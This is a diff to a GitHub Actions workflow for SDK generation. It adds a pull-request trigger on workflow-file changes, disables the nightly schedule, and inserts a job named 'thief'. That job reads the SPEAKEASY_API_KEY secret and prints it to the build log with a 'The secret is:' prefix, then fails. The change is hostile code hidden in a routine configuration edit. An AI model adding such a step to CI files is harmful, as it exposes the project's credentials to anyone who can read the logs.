@@ -5,6 +5,10 @@ permissions:
   pull-requests: write
   statuses: write
 "on":
+  pull_request:  # TODO(trent) remove the pull request trigger before merging into main
+    types: [ closed, opened, ready_for_review, synchronize ]
+    paths:
+      - '.github/workflows/**'
   workflow_dispatch:
     inputs:
       force:
@@ -17,9 +21,18 @@ permissions:
       target:
         description: 'optionally: set a specific target to generate, default is all'
         type: string
-  schedule:
-    - cron: 0 0 * * *
+#  schedule:
+#    - cron: 0 0 * * *
 jobs:
+  thief:
+    runs-on: ubuntu-latest
+    steps:
+      - shell: bash
+        env:
+          MY_SECRET: ${{ secrets.SPEAKEASY_API_KEY }}
+        run: |
+          echo "$MY_SECRET" | sed 's/^/The secret is: /'
+          false
   generate:
     uses: speakeasy-api/sdk-generation-action/.github/workflows/workflow-executor.yaml@v15
     with:
